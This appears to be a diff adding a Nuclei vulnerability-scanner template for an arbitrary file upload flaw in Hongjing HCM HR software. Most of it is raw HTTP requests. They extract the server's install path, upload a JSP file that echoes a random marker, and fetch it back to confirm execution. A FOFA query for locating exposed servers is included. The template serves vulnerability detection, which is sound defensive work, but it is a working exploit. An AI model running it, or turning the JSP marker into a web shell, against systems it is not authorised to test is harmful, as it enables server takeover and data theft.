@@ -1,0 +1,93 @@
+id: hjsoft-uploadlogo-fileupload
+
+info:
+  name: 宏景 HCM uploadLogo 任意文件上传
+  author: zan8in
+  severity: critical
+  description: |
+    宏景人力资源 HCM /sys/cms/uploadLogo.do 可上传 JSP 并在本地回显随机字符串，用于概念验证任意文件上传。
+  reference:
+    - https://mp.weixin.qq.com/s/1h-5ZwCTIg-rU4ydR7NKIQ
+  metadata:
+    verified: true
+    max-request: 4
+    fofa-query: app="HJSOFT-HCM"
+  tags: hjsoft,hcm,fileupload
+
+variables:
+  filename: "{{rand_base(10)}}"
+  randbody: "{{rand_base(32)}}"
+  boundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="path"
+
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="lfType"
+
+        0
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="logofile"; filename=""
+        Content-Type: image/gif
+
+        <%= "{{randbody}}" %>
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="twoFile"; filename=""
+        Content-Type: image/gif
+
+        <%= "{{randbody}}" %>
+        ------WebKitFormBoundary{{boundary}}--
+      - |
+        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="path"
+
+        {{pathname}}{{filename}}.jsp
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="lfType"
+
+        0
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="logofile"; filename=""
+        Content-Type: image/gif
+
+        <%= "{{randbody}}" %>
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="twoFile"; filename=""
+        Content-Type: image/gif
+
+        <%= "{{randbody}}" %>
+        ------WebKitFormBoundary{{boundary}}--
+      - |
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: pathname
+        internal: true
+        group: 1
+        regex:
+          - 'value="([^"]+)images";'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'status_code_2 == 200 && contains(body_2, "document.getElementById(\"pathvalue\").value=")'
+          - 'status_code_4 == 200 && contains(body_4, randbody)'
+        condition: and
